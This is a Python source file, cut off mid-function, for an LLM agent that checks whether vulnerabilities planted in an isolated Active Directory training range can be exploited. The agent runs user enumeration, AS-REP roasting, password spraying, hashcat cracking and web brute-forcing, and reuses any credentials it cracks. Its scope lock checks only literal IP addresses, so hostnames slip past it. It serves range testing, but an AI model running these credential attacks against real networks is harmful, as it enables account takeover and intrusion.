"""
qa_agent.py
===========
QA Agent —— 靶場部署後的驗證/測試/除錯代理 (constrained tool calling)。

讀取 range_manifest.json,對種下的弱點逐一驗證「真的可利用」。

設計:
  - LLM 負責**編排** (下一步測什麼、失敗要不要 debug) 與**摘要** (寫人類可讀報告)。
  - 有 manifest 時,封裝好的工具 (test_vuln 等) 做**確定性判定** (regex verdict),
    LLM 直接採信,不做底層 pass/fail。
  - 唯一的硬限制是**目標鎖定 range 網段** (_assert_in_range) —— 不管走哪個工具,IP
    一律被檢查是否落在 range CIDR 內,範圍外一律 [BLOCKED]。除此之外,LLM 有相當高的
    自由度: 可以用 run_tool 自己組偵察/驗證指令 (不必受限於預先寫好的 id→testcase
    對照表)、用 crack_hash 在本機對拿到的 hash 做真正的離線破解 (kerberoast/AS-REP,
    自動找系統上的 rockyou.txt)、用 web_fetch_range 瀏覽 range 內主機的 web 服務做偵察。
    這些是「怎麼做」交給 LLM 判斷,「能不能碰這個目標」交給工具層強制的分工。
  - HITL: 測試前確認範圍、debug 前確認、破壞性操作前確認 (password_spray 等有鎖帳/
    帳號風險的動作)。

黑箱 / 白箱:
  --mode blackbox  只用 QA 犧牲帳號 (模擬攻擊者初始存取),測「打得通嗎」。
  --mode whitebox  額外允許讀 manifest 全部細節 + 透過 MCP 登入 DC 檢查實際設定值,
                   用於 debug 與精確根因分析。

無 manifest 模式:
  若 --manifest 指到的檔案不存在 (例如對外部/未知靶場做稽核,沒有 cyberrange worker
  產生的 range_manifest.json),agent 改用 --network-cidr 對網段做 nmap 探索找出 DC
  (88/389/445 皆開),並嘗試以匿名 LDAP rootDSE 查詢猜出網域名稱。找到 DC 後,不再依賴
  "種下的弱點清單",改用 generic_ad_audit 對 qa_testcases 中**全部**已知檢測項目跑一輪
  基線稽核 (黑箱)。若有提供 --qa-user/--qa-pass,連需要憑證的項目也會測;沒提供則那些
  項目回 skip。

依賴:
  pip install "langgraph>=1.0" langchain pydantic
  地端 LLM: langchain-ollama 或 langchain-openai
  工具 (在 attack host 上): impacket, netexec(nxc), nmap, ldapsearch, bloodhound-python
  同資料夾: range_manifest.py, qa_testcases.py, ad_vuln_catalog.py, ad_vuln_catalog.json

⚠️ 只對隔離 range 網段執行。工具層強制目標在 range CIDR 內,拒絕範圍外目標。
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import os
import re
import shutil
import socket
import subprocess
import sys
from datetime import datetime, timezone
from typing import Any, Literal, Optional

from pydantic import BaseModel, Field

from langchain.chat_models import init_chat_model
from langchain.tools import tool
from langgraph.checkpoint.memory import InMemorySaver

import qa_testcases as tcs
from range_manifest import load_manifest, RangeManifest


# ═══════════════════════════════════════════════════════════════════════════
# 全域: 載入的 manifest + 模式 + range 網段 (工具讀取)
# ═══════════════════════════════════════════════════════════════════════════
_MF: dict = {}
_MODE: str = "blackbox"
_RANGE_NET: Optional[ipaddress.IPv4Network] = None
_NO_MANIFEST: bool = False
_TIMEOUT = int(os.environ.get("QA_TOOL_TIMEOUT", "180"))


def _load(path: str, discover_cidr: Optional[str] = None, ad_domain: Optional[str] = None,
          dc_ip: Optional[str] = None, qa_user: Optional[str] = None,
          qa_pass: Optional[str] = None) -> None:
    """載入 manifest。若 path 不存在,改用 discover_cidr 做無 manifest 探索。"""
    global _MF, _RANGE_NET, _NO_MANIFEST
    if path and os.path.exists(path):
        mf = load_manifest(path)
        _MF = mf.model_dump()
        _NO_MANIFEST = False
    else:
        _NO_MANIFEST = True
        _MF = _discover_manifest(discover_cidr, ad_domain, dc_ip, qa_user, qa_pass)
    try:
        _RANGE_NET = ipaddress.ip_network(_MF.get("network_cidr", "10.2.10.0/24"), strict=False)
    except ValueError:
        _RANGE_NET = None
    tcs._LAST_MF = _MF  # nslookup verdict 需要


# ═══════════════════════════════════════════════════════════════════════════
# 無 manifest 探索: 掃整個網段找出所有存活主機 (不是只找 DC —— 真實環境的攻擊面
# 通常不會直通 DC,workstation/server/對外 web app 都可能是切入點),猜網域名,
# 組出最小可用的 in-memory manifest。
# ═══════════════════════════════════════════════════════════════════════════
_DISCOVERY_PORTS = "21,22,23,25,53,80,88,110,135,139,389,443,445,636," \
                   "1433,3268,3269,3306,3389,5985,5986,8000,8080,8443,9200"


def _discover_hosts(cidr: str) -> list[dict]:
    """nmap 掃整個 cidr,列出所有存活主機與其開放的常見 port
    (AD/SMB/RDP/WinRM/web/DB...),不只找 DC。"""
    rc, out, err = _run(["nmap", "-p", _DISCOVERY_PORTS, "--open", "-Pn", cidr])
    if not out:
        return []
    hosts: list[dict] = []
    current_ip, open_ports = None, set()

    def _flush():
        if current_ip:
            hosts.append({"ip": current_ip, "ports": sorted(open_ports, key=int)})

    for line in out.splitlines():
        m = re.match(r"Nmap scan report for (?:\S+ )?\(?([\d.]+)\)?", line)
        if m:
            _flush()
            current_ip, open_ports = m.group(1), set()
        pm = re.match(r"(\d+)/tcp\s+open", line)
        if pm:
            open_ports.add(pm.group(1))
    _flush()
    return hosts


def _classify_host(ports: set[str]) -> tuple[str, list[str]]:
    """依開放 port 猜角色/服務標籤,純粹是初步猜測 —— agent 應該自己再用 run_tool
    (nmap -sV / whatweb 等) 驗證實際服務版本,不要只信這個分類。"""
    if {"88", "389", "445"} <= ports:
        role = "dc"
    elif ports & {"3389", "5985", "5986"}:
        role = "workstation"
    elif ports & {"445", "139"}:
        role = "server"
    else:
        role = "unknown"
    svc = []
    if ports & {"80", "443", "8000", "8080", "8443"}:
        svc.append("http")
    if "445" in ports or "139" in ports:
        svc.append("smb")
    if "389" in ports or "636" in ports:
        svc.append("ldap")
    if "88" in ports:
        svc.append("kerberos")
    if "3389" in ports:
        svc.append("rdp")
    if "5985" in ports or "5986" in ports:
        svc.append("winrm")
    if "3306" in ports:
        svc.append("mysql")
    if "1433" in ports:
        svc.append("mssql")
    if "9200" in ports:
        svc.append("elasticsearch")
    return role, svc


def _discover_domain(dc_ip: str) -> Optional[str]:
    """匿名 LDAP rootDSE 查 defaultNamingContext,轉成網域名。查不到就放棄 (人可用 --ad-domain 補)。"""
    rc, out, err = _run(["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-s", "base",
                         "defaultNamingContext"])
    m = re.search(r"defaultNamingContext:\s*(.+)", out)
    if not m:
        return None
    parts = re.findall(r"DC=([^,]+)", m.group(1).strip(), re.IGNORECASE)
    return ".".join(parts) if parts else None


def _discover_manifest(cidr: Optional[str], ad_domain: Optional[str], dc_ip: Optional[str],
                        qa_user: Optional[str], qa_pass: Optional[str]) -> dict:
    if not dc_ip and not cidr:
        raise SystemExit(
            "[QA] 找不到 range_manifest.json,且未給 --network-cidr / --dc-ip,"
            "無法探索目標,中止。")
    machines: list[dict] = []
    if cidr:
        print(f"[QA] 無 manifest,對 {cidr} 做 nmap 掃描找出所有存活主機 (不只找 DC) ...")
        for h in _discover_hosts(cidr):
            ports = set(h["ports"])
            role, svc = _classify_host(ports)
            machines.append({
                "hostname": f"HOST-{h['ip'].split('.')[-1]}", "role": role, "template": "",
                "ip": h["ip"], "vlan": 10, "os_version": "", "fqdn": "",
                "services": svc, "credentials": [], "open_ports": h["ports"],
            })
        print(f"[QA] 探索到 {len(machines)} 台存活主機: " +
              ", ".join(f"{m['ip']}({m['role']}:{','.join(m['services']) or '?'})"
                       for m in machines))

    if not dc_ip:
        dc_m = next((m for m in machines if m["role"] == "dc"), None)
        if not dc_m:
            raise SystemExit(
                f"[QA] 在 {cidr} 內找不到同時開 88/389/445 的主機 (DC)。"
                "改用 --dc-ip 明確指定目標,或確認網段/防火牆設定是否正確。")
        dc_ip = dc_m["ip"]
        print(f"[QA] 探索到疑似 DC: {dc_ip}")
    elif not any(m["ip"] == dc_ip for m in machines):
        machines.append({"hostname": "DC-DISCOVERED", "role": "dc", "template": "", "ip": dc_ip,
                         "vlan": 10, "os_version": "", "fqdn": "",
                         "services": ["ldap", "kerberos", "smb", "dns"], "credentials": [],
                         "open_ports": []})
    else:
        for m in machines:
            if m["ip"] == dc_ip:
                m["role"] = "dc"

    if not ad_domain:
        ad_domain = _discover_domain(dc_ip) or "unknown.local"
        print(f"[QA] 探索到網域: {ad_domain}")
    for m in machines:
        if not m.get("fqdn"):
            m["fqdn"] = f"{m['hostname'].lower()}.{ad_domain}"

    net = cidr or f"{'.'.join(dc_ip.split('.')[:3])}.0/24"
    qa_cred = None
    if qa_user and qa_pass:
        qa_cred = {"username": qa_user, "password": qa_pass, "domain": ad_domain,
                   "kind": "qa_sacrificial", "sensitive": True,
                   "note": "供自 CLI (--qa-user/--qa-pass),非來自 manifest"}
    return {
        "schema_version": "1.0", "range_id": "discovered-no-manifest", "ad_domain": ad_domain,
        "ad_version": "", "network_cidr": net, "machines": machines,
        "planted_vulns": [], "endpoints": [], "qa_credential": qa_cred,
        "notes": "無 range_manifest.json,由 QA agent 自行探索組出。machines 涵蓋整個網段內"
                 "所有存活主機 (不只 DC),role/services 只是依開放 port 的初步猜測。"
                 "無種植弱點清單,用 generic_ad_audit 對已知檢測項目跑基線稽核。",
    }


# ═══════════════════════════════════════════════════════════════════════════
# 安全: 目標鎖定 range 網段
# ═══════════════════════════════════════════════════════════════════════════
def _assert_in_range(argv: list[str]) -> Optional[str]:
    """檢查指令中的 IP 是否都落在 range 網段。回傳錯誤字串,或 None 表示通過。"""
    if _RANGE_NET is None:
        return None
    ips = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", " ".join(argv))
    for ip in ips:
        try:
            if ipaddress.ip_address(ip) not in _RANGE_NET:
                return f"[BLOCKED] target {ip} is outside range network {_RANGE_NET}"
        except ValueError:
            continue
    return None


def _run(argv: list[str]) -> tuple[int, str, str]:
    """執行指令 (已通過 range 檢查)。工具不存在時回錯而非 crash。"""
    if not shutil.which(argv[0]):
        return 127, "", f"tool not found: {argv[0]} (install it on the attack host)"
    try:
        p = subprocess.run(argv, capture_output=True, text=True, timeout=_TIMEOUT)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired:
        return 124, "", f"timeout after {_TIMEOUT}s"
    except OSError as e:
        return 1, "", str(e)


# ═══════════════════════════════════════════════════════════════════════════
# 受約束的工具 (LLM 只能填 manifest 內的參數;目標鎖 range)
# ═══════════════════════════════════════════════════════════════════════════
@tool
def list_planted_vulns() -> str:
    """列出 manifest 中所有種下的弱點及其測試座標。回傳 JSON。
    先呼叫這個以了解要驗證什麼。若沒有 manifest (無種植弱點清單),回傳空清單提示,
    改呼叫 generic_ad_audit 做基線稽核。"""
    if _NO_MANIFEST:
        return json.dumps({"status": "no_manifest",
                           "evidence": "沒有 range_manifest.json,無種植弱點清單可比對。"
                                       "改呼叫 generic_ad_audit 對已知檢測項目跑一輪基線稽核。"},
                          ensure_ascii=False)
    out = [{"id": v["id"], "name": v["name"], "kind": v["kind"],
            "target": v["target"], "test_case_id": v["test_case_id"],
            "has_direct_test": tcs.has_direct_test(v["id"]),
            "bh_verified": v["id"] in tcs.BH_VULNS}
           for v in _MF.get("planted_vulns", [])]
    return json.dumps(out, ensure_ascii=False)


# ═══════════════════════════════════════════════════════════════════════════
# 初始存取偵察 (無 manifest / 沒有給 --qa-user/--qa-pass 時,agent 自己找路進去,
# 而不是遇到需要憑證的項目就 skip)
# ═══════════════════════════════════════════════════════════════════════════
_COMMON_PASSWORDS = [
    "Password1", "Welcome1", "Passw0rd!", "P@ssw0rd", "ChangeMe123!",
    "Summer2024!", "Winter2024!", "Company123!", "P@ssword1", "Qwerty123!",
]


def _enum_users_anon(dc_ip: str, domain: str) -> list[str]:
    """不需憑證的使用者列舉,依序試好幾種手法,不是只有一種:
    1. 匿名 LDAP bind 直接列 sAMAccountName。
    2. SMB null-session RID cycling (nxc --rid-brute)。
    3. rpcclient null-session enumdomusers。
    4. impacket-lookupsid 空密碼 SID 爆破。
    任一種有結果就用,全部串起來 (不是找到第一批就停),盡量把使用者名單湊齊。"""
    users: list[str] = []
    parts = [p for p in domain.split(".") if p]
    base = ",".join(f"DC={p}" for p in parts)

    rc, out, err = _run(["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-b", base,
                         "(objectClass=user)", "sAMAccountName"])
    users += re.findall(r"sAMAccountName:\s*(\S+)", out)

    rc, out, err = _run(["nxc", "smb", dc_ip, "-u", "", "-p", "", "--rid-brute"])
    for line in out.splitlines():
        if "SidTypeUser" not in line:
            continue
        m = re.search(r"\\([^\\\s]+)\s+\(SidTypeUser\)", line)
        if m:
            users.append(m.group(1))

    if shutil.which("rpcclient"):
        rc, out, err = _run(["rpcclient", "-U", "", "-N", dc_ip, "-c", "enumdomusers"])
        users += re.findall(r"user:\[([^\]]+)\]", out)

    if shutil.which("impacket-lookupsid"):
        rc, out, err = _run(["impacket-lookupsid", f"{domain}/@{dc_ip}", "-no-pass"])
        for line in out.splitlines():
            m = re.search(r"\\([^\\\s]+)\s*\(SidTypeUser\)", line)
            if m:
                users.append(m.group(1))

    return sorted(set(users))


def _crack_asrep_builtin(hashes: list[str]) -> Optional[dict]:
    """用內建的一小份常見密碼清單線上核對 AS-REP hash (需本機有 hashcat)。找不到就回 None,
    不代表沒發現 —— hash 本身已是可回報的弱點證據,由呼叫端另外回報。"""
    if not hashes or not shutil.which("hashcat"):
        return None
    hashfile, wordfile, potfile = "/tmp/qa_asrep.hash", "/tmp/qa_common.txt", "/tmp/qa_asrep.cracked"
    try:
        with open(hashfile, "w") as f:
            f.write("\n".join(hashes))
        with open(wordfile, "w") as f:
            f.write("\n".join(_COMMON_PASSWORDS))
    except OSError:
        return None
    _run(["hashcat", "-m", "18200", hashfile, wordfile,
          "--potfile-disable", "-o", potfile, "--force"])
    try:
        with open(potfile) as f:
            line = f.readline().strip()
    except OSError:
        return None
    if ":" not in line:
        return None
    h, pw = line.rsplit(":", 1)
    m = re.search(r"\$krb5asrep\$(?:\d+:)?([^@]+)@", h)
    return {"user": m.group(1) if m else "unknown", "password": pw}


@tool
def enum_users() -> str:
    """[初始存取偵察 — 第一步,不需任何憑證] 對已知 DC 依序嘗試匿名 LDAP bind、SMB
    null-session RID cycling、rpcclient enumdomusers、impacket-lookupsid SID 爆破,
    四種手法串起來盡量湊出使用者清單 (不是有一種有結果就停)。沒有 --qa-user/--qa-pass
    時,遇到需要憑證的檢測項目前應先呼叫這個,而不是直接判定 skip。
    如果四種都槓龜,不代表沒有使用者可列——可以用 run_tool 自己嘗試別的手法 (例如
    先用 web_fetch_range/run_tool 找到員工姓名後,自己組 firstname.lastname 之類的
    命名慣例猜使用者名,再拿去 crack_hash/asrep_roast_open 驗證)。回傳找到的使用者清單。"""
    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
    if not dc:
        return json.dumps({"status": "error", "evidence": "manifest 無 DC"}, ensure_ascii=False)
    users = _enum_users_anon(dc["ip"], _MF["ad_domain"])
    return json.dumps({"status": "ok" if users else "empty", "users": users}, ensure_ascii=False)


@tool
def asrep_roast_open() -> str:
    """[初始存取偵察 — 不需憑證] 對 enum_users 列舉到的帳號跑 AS-REP roasting
    (若尚未列舉過會自動先列舉)。任何關閉 Kerberos pre-auth 的帳號都會回傳可離線破解的
    $krb5asrep$ hash —— 這本身就是一個可回報的發現。同時會嘗試用內建的常見弱密碼清單
    線上核對,核對成功會自動把帳密填入 qa_credential,後續需要憑證的檢測項目就能直接使用,
    不必再回報 skip。"""
    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
    if not dc:
        return json.dumps({"status": "error", "evidence": "manifest 無 DC"}, ensure_ascii=False)
    users = _enum_users_anon(dc["ip"], _MF["ad_domain"])
    if not users:
        return json.dumps({"status": "empty",
                           "evidence": "匿名列舉不到任何使用者,無法嘗試 AS-REP roast"},
                          ensure_ascii=False)
    userfile = "/tmp/qa_discovered_users.txt"
    try:
        with open(userfile, "w") as f:
            f.write("\n".join(users))
    except OSError as e:
        return json.dumps({"status": "error", "evidence": str(e)}, ensure_ascii=False)
    argv = ["impacket-GetNPUsers", f"{_MF['ad_domain']}/", "-no-pass",
            "-usersfile", userfile, "-dc-ip", dc["ip"], "-format", "hashcat"]
    blocked = _assert_in_range(argv)
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    rc, out, err = _run(argv)
    hashes = re.findall(r"(\$krb5asrep\$\S+)", out)
    if not hashes:
        return json.dumps({"status": "not_vulnerable", "users_tried": users,
                           "evidence": (out + err)[-300:]}, ensure_ascii=False)
    cracked = _crack_asrep_builtin(hashes)
    if cracked:
        _MF["qa_credential"] = {"username": cracked["user"], "password": cracked["password"],
                                "domain": _MF["ad_domain"], "kind": "qa_sacrificial",
                                "sensitive": True, "note": "由 AS-REP roast + 常見密碼核對自動取得"}
        return json.dumps({"status": "cracked", "username": cracked["user"],
                           "note": "已自動填入 qa_credential,後續檢測項目可直接使用"},
                          ensure_ascii=False)
    return json.dumps({"status": "hash_only", "hashes": hashes[:5], "users_tried": users,
                       "note": "已拿到 AS-REP hash,本身即為可回報的弱點 "
                               "(帳號未強制 Kerberos pre-auth)。內建清單沒核對出明文,"
                               "若仍需憑證可再呼叫 password_spray (需人工核准)。"},
                      ensure_ascii=False)


@tool
def password_spray(users: list[str]) -> str:
    """[初始存取偵察 — 有鎖帳風險,需人工核准] 對指定使用者清單,用內建一組極常見密碼
    逐一嘗試,每個帳號每個密碼只試一次以降低鎖帳風險,找可用的初始憑證。
    只在 enum_users / asrep_roast_open 都沒能取得憑證、但確實需要驗證身分的檢測項目時才用。
    找到有效帳密會自動填入 qa_credential 供後續檢測使用。
    users 用 enum_users 回傳的清單,不要自己編。"""
    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
    if not dc:
        return json.dumps({"status": "error", "evidence": "manifest 無 DC"}, ensure_ascii=False)
    if not users:
        return json.dumps({"status": "error", "evidence": "users 為空,先呼叫 enum_users"},
                          ensure_ascii=False)
    userfile = "/tmp/qa_spray_users.txt"
    try:
        with open(userfile, "w") as f:
            f.write("\n".join(users))
    except OSError as e:
        return json.dumps({"status": "error", "evidence": str(e)}, ensure_ascii=False)
    for pw in _COMMON_PASSWORDS:
        argv = ["nxc", "smb", dc["ip"], "-u", userfile, "-p", pw]
        blocked = _assert_in_range(argv)
        if blocked:
            return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
        rc, out, err = _run(argv)
        m = re.search(r"\[\+\]\s+\S+\\(\S+):", out)
        if m:
            user = m.group(1)
            _MF["qa_credential"] = {"username": user, "password": pw, "domain": _MF["ad_domain"],
                                    "kind": "qa_sacrificial", "sensitive": True,
                                    "note": "由 password spray 自動取得"}
            return json.dumps({"status": "found", "username": user,
                               "note": "已自動填入 qa_credential,密碼已遮蔽不外露"},
                              ensure_ascii=False)
    return json.dumps({"status": "not_found",
                       "evidence": f"對 {len(users)} 個帳號各試了 {len(_COMMON_PASSWORDS)} 組常見密碼"
                                   ",1 次/組,沒有命中"}, ensure_ascii=False)


# ═══════════════════════════════════════════════════════════════════════════
# 自由工具呼叫: 不綁 id→testcase 對照表,LLM 自己決定怎麼組指令/怎麼列舉/怎麼破解/
# 怎麼瀏覽。唯一的硬限制是目標鎖 range 網段。
# secretsdump/wmiexec/psexec 這類真的登入機器/傾印憑證/執行指令的工具,不放在這裡的
# 允許清單裡 —— 不是不開放,而是獨立成 secretsdump_dc / wmiexec_run / psexec_run 三個
# 專用工具 (見下方),每次呼叫都強制 HITL 核准,讓「高風險動作」在工具名稱層級就能被
# middleware 攔下,不必在 run_tool 裡另外判斷 binary 是否危險。ntlmrelayx (需要常駐監聽、
# 會主動攔截其他人的流量) 目前不開放,風險模型跟其他工具不同,先不納入。
# ═══════════════════════════════════════════════════════════════════════════
ALLOWED_BINARIES = {
    "nmap", "nxc", "netexec", "ldapsearch", "dig", "nslookup",
    "smbclient", "rpcclient", "bloodhound-python", "curl",
    "impacket-GetNPUsers", "impacket-GetUserSPNs", "impacket-rbcd",
    "impacket-findDelegation", "impacket-lookupsid", "impacket-getTGT",
    "hashcat", "john",
    "find", "locate", "which",  # 自我診斷用: 內建候選路徑找不到東西時,自己找 kali 上實際在哪
    "whatweb", "nikto", "gobuster", "ffuf", "wpscan",  # web 滲透: 指紋/漏掃/目錄爆破
}


@tool
def run_tool(binary: str, args: list[str]) -> str:
    """[自由組指令] 當現成的封裝工具 (enum_users / test_vuln / generic_ad_audit ...)
    不夠用、你想自己決定怎麼列舉/怎麼查/怎麼驗證時用這個,不必受限於預先寫死的
    id→testcase 對照表。
    binary 必須在允許清單內: nmap, nxc/netexec, ldapsearch, dig, nslookup, smbclient,
    rpcclient, bloodhound-python, curl, impacket-GetNPUsers/GetUserSPNs/rbcd/
    findDelegation/lookupsid/getTGT, hashcat, john。
    想真的登入機器/拿 shell/傾印憑證,改用 secretsdump_dc / wmiexec_run / psexec_run
    (這三個每次都需要人工核准,不能透過 run_tool 繞過)。
    args 中任何看起來像 IP 的字串,都會被檢查是否落在 range 網段內,不在範圍內直接
    [BLOCKED] 拒絕執行 —— 這是唯一的硬限制,其餘怎麼組完全由你判斷。
    回傳 returncode / stdout / stderr (截斷)。"""
    if binary not in ALLOWED_BINARIES:
        return json.dumps({"status": "denied",
                           "evidence": f"binary '{binary}' 不在允許清單: {sorted(ALLOWED_BINARIES)}"},
                          ensure_ascii=False)
    argv = [binary] + [str(a) for a in args]
    blocked = _assert_in_range(argv)
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    rc, out, err = _run(argv)
    return json.dumps({"status": "ok", "returncode": rc, "cmd": " ".join(argv),
                       "stdout": out[-4000:], "stderr": err[-1000:]}, ensure_ascii=False)


_WORDLIST_CANDIDATES = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
    "/opt/wordlists/rockyou.txt",
    os.path.expanduser("~/wordlists/rockyou.txt"),
]

_HASHCAT_MODES = {"asrep": "18200", "kerberoast": "13100", "ntlm": "1000", "ntlmv2": "5600"}


@tool
def crack_hash(hash_type: str, hashes: list[str], wordlist: str = "") -> str:
    """[本地離線破解] 對已取得的 hash (asrep_roast_open 或 run_tool 跑 kerberoast 拿到的
    $krb5tgs$/$krb5asrep$,或其他管道拿到的 NTLM/NTLMv2) 在本機用 hashcat 做真正的離線
    密碼破解,不是只對幾個常見密碼做形式檢查。
    hash_type: "asrep" | "kerberoast" | "ntlm" | "ntlmv2"。
    wordlist: 指定路徑就用指定的;留空會自動找幾個常見的 rockyou.txt 位置,找不到才退回
    內建的一小份常見密碼清單 (效果有限)。attack host 是 kali,如果這裡列的候選路徑都沒中,
    不要就這樣算了 —— 自己用 run_tool 呼叫 find/locate (例如
    `find /usr/share -iname "*.txt" -path "*wordlist*"` 或
    `locate rockyou.txt`) 去 kali 常見的字典/工具存放位置 (/usr/share/wordlists/,
    /usr/share/seclists/,/usr/share/john/) 找找看實際路徑在哪,找到後再把正確路徑傳進
    wordlist 參數重跑一次。
    破到的帳密會自動填入 qa_credential,後續需要憑證的檢測項目可以直接使用。"""
    mode = _HASHCAT_MODES.get(hash_type)
    if not mode:
        return json.dumps({"status": "error",
                           "evidence": f"未知 hash_type '{hash_type}',可用: {list(_HASHCAT_MODES)}"},
                          ensure_ascii=False)
    if not shutil.which("hashcat"):
        return json.dumps({"status": "error", "evidence": "hashcat not found on attack host"},
                          ensure_ascii=False)
    if not hashes:
        return json.dumps({"status": "error", "evidence": "hashes 為空"}, ensure_ascii=False)
    wl = wordlist or next((w for w in _WORDLIST_CANDIDATES if os.path.exists(w)), None)
    used_builtin = False
    if not wl:
        wl = "/tmp/qa_common.txt"
        used_builtin = True
        try:
            with open(wl, "w") as f:
                f.write("\n".join(_COMMON_PASSWORDS))
        except OSError as e:
            return json.dumps({"status": "error", "evidence": str(e)}, ensure_ascii=False)
    hashfile, potfile = "/tmp/qa_crack.hash", "/tmp/qa_crack.cracked"
    try:
        with open(hashfile, "w") as f:
            f.write("\n".join(hashes))
        if os.path.exists(potfile):
            os.remove(potfile)
    except OSError as e:
        return json.dumps({"status": "error", "evidence": str(e)}, ensure_ascii=False)
    rc, out, err = _run(["hashcat", "-m", mode, hashfile, wl,
                         "--potfile-disable", "-o", potfile, "--force"])
    cracked = []
    try:
        with open(potfile) as f:
            for line in f:
                if ":" in line:
                    h, pw = line.strip().rsplit(":", 1)
                    cracked.append({"hash": h[:60], "password": pw})
    except OSError:
        pass
    if cracked and hash_type in ("asrep", "kerberoast"):
        m = re.search(r"\$krb5(?:asrep|tgs)\$(?:\d+:)?([^@/]+)[@/]", cracked[0]["hash"])
        user = m.group(1) if m else None
        if user:
            _MF["qa_credential"] = {"username": user, "password": cracked[0]["password"],
                                    "domain": _MF.get("ad_domain", ""), "kind": "qa_sacrificial",
                                    "sensitive": True, "note": f"由本地 {hash_type} 破解取得"}
    return json.dumps({"status": "cracked" if cracked else "not_cracked",
                       "wordlist_used": wl, "used_builtin_wordlist": used_builtin,
                       "cracked_count": len(cracked), "results": cracked[:20]}, ensure_ascii=False)


@tool
def web_fetch_range(url: str, extra_curl_args: Optional[list[str]] = None) -> str:
    """[網頁瀏覽 — 僅限 range 內目標] 對 range 內主機的 web 服務 (ADFS/IIS/自架站台/
    wazuh dashboard/內部工具...) 發 HTTP(S) request 做偵察,例如找登入頁、確認版本、
    看有沒有暴露的 API 或預設頁面。url 的 host 必須能解析到 range 網段內的 IP,解析不到
    range 內的目標會被拒絕 —— 這個工具不能拿來瀏覽 range 以外的網際網路。
    回傳 HTTP header + body (截斷)。"""
    m = re.search(r"://([^/:]+)", url)
    host = m.group(1) if m else url
    try:
        ip = host if re.match(r"^\d+\.\d+\.\d+\.\d+$", host) else socket.gethostbyname(host)
    except socket.gaierror:
        return json.dumps({"status": "error", "evidence": f"無法解析主機 {host}"},
                          ensure_ascii=False)
    blocked = _assert_in_range(["curl", ip])
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    argv = ["curl", "-s", "-k", "-i", "--max-time", "20", url] + [str(a) for a in (extra_curl_args or [])]
    rc, out, err = _run(argv)
    return json.dumps({"status": "ok", "cmd": " ".join(argv),
                       "response": out[-4000:], "stderr": err[-500:]}, ensure_ascii=False)


_DIRB_WORDLIST_CANDIDATES = [
    "/usr/share/wordlists/dirb/common.txt",
    "/usr/share/seclists/Discovery/Web-Content/common.txt",
    "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
]


@tool
def web_dirbust_range(url: str, wordlist: str = "") -> str:
    """[網頁滲透 — 目錄/端點爆破,僅限 range 內目標] 對 range 內某個 web 服務跑目錄/檔案
    爆破 (gobuster dir),找隱藏的管理頁、API 端點、備份檔、.git 等。這是網頁滲透的起手式,
    有 http 服務的主機 (見 get_range_info 的 web_hosts) 應該先跑這個、再用 web_fetch_range
    人工深入看有意義的路徑,不要只對根目錄發一次 curl 就結案。
    url 的 host 必須解析到 range 網段內,否則拒絕。
    wordlist 留空會自動找 kali 上常見字典 (dirb/common.txt、seclists common.txt、
    dirbuster medium list);都找不到的話,不要放棄,改用 run_tool 呼叫
    find/locate 去 /usr/share/wordlists/、/usr/share/seclists/ 底下自己找,找到路徑後
    重新帶入 wordlist 參數。"""
    m = re.search(r"://([^/:]+)", url)
    host = m.group(1) if m else url
    try:
        ip = host if re.match(r"^\d+\.\d+\.\d+\.\d+$", host) else socket.gethostbyname(host)
    except socket.gaierror:
        return json.dumps({"status": "error", "evidence": f"無法解析主機 {host}"},
                          ensure_ascii=False)
    blocked = _assert_in_range(["gobuster", ip])
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    if not shutil.which("gobuster"):
        return json.dumps({"status": "error", "evidence": "gobuster not found on attack host"},
                          ensure_ascii=False)
    wl = wordlist or next((w for w in _DIRB_WORDLIST_CANDIDATES if os.path.exists(w)), None)
    if not wl:
        return json.dumps({"status": "no_wordlist",
                           "evidence": "內建候選字典都找不到,改用 run_tool 呼叫 find/locate "
                                       "在 /usr/share/wordlists 或 /usr/share/seclists 底下找,"
                                       "找到路徑後帶進 wordlist 參數重跑"}, ensure_ascii=False)
    argv = ["gobuster", "dir", "-u", url, "-w", wl, "-q", "-t", "20", "-k"]
    rc, out, err = _run(argv)
    hits = re.findall(r"^(/\S+)\s+\(Status:\s*(\d+)\)", out, re.MULTILINE)
    return json.dumps({"status": "ok" if hits else "no_hits", "wordlist_used": wl,
                       "found": [{"path": p, "status": s} for p, s in hits][:50],
                       "raw_tail": out[-1000:]}, ensure_ascii=False)


@tool
def generic_ad_audit() -> str:
    """[無 manifest 模式專用] 沒有 range_manifest.json、不知道種了哪些弱點時,
    對已探索到的 DC 跑 qa_testcases 中**全部**已知 AD 弱點檢測項目 (AS-REP roast、
    kerberoast、無簽章 SMB、匿名 LDAP、弱密碼策略、GPP cpassword...等),當成黑箱基線稽核。
    在呼叫這個之前,若還沒有憑證,應先用 enum_users / asrep_roast_open (必要時
    password_spray) 嘗試取得初始存取;仍拿不到憑證的項目才回 skip,並在報告中如實說明
    「已嘗試但找不到初始存取」而非「未提供憑證」。
    回傳每項 pass/fail/skip + evidence。manifest 存在時不要呼叫這個,改用
    list_planted_vulns + test_vuln。"""
    if not _NO_MANIFEST:
        return json.dumps({"status": "skip",
                           "evidence": "manifest 存在,請改用 list_planted_vulns + test_vuln"},
                          ensure_ascii=False)
    have_creds = bool((_MF.get("qa_credential") or {}).get("password"))
    results = []
    for vid, tc in sorted(tcs.TEST_CASES.items()):
        if tc.needs_creds and not have_creds:
            results.append({"vuln_id": vid, "name": tc.name, "status": "skip",
                            "evidence": "no credential — 已嘗試 enum_users/asrep_roast_open"
                                        "/password_spray 取得初始存取仍未成功"})
            continue
        argv = tc.build_cmd(_MF, {})
        blocked = _assert_in_range(argv)
        if blocked:
